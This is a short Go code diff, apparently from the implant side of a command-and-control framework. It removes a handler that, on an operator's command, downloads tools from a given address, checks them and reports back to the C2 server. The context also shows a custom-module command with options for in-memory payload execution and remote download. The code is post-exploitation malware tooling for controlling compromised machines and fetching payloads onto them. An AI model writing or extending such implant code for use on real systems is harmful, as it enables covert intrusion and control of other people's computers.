@@ -251,22 +251,6 @@ func runDeletePortFwd(cmd *cobra.Command, args []string) {
 	c2transport.NotifyC2(cmd, "")
 }
 
-// runUtils implements !utils --checksum <checksum> --download_addr <download_addr>
-func runUtils(cmd *cobra.Command, args []string) {
-	checksum, _ := cmd.Flags().GetString("checksum")
-	downloadAddr, _ := cmd.Flags().GetString("download_addr")
-	if checksum == "" {
-		c2transport.NotifyC2(cmd, "Error: args error\n")
-		return
-	}
-	out := modules.VaccineHandler(downloadAddr, checksum)
-	if out != "[+] Utils have been successfully installed" {
-		c2transport.NotifyC2(cmd, "Error: %s\n", out)
-		return
-	}
-	c2transport.NotifyC2(cmd, "%s\n", out)
-}
-
 // runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>
 func runCustomModule(cmd *cobra.Command, args []string) {
 	modName, _ := cmd.Flags().GetString("mod_name")
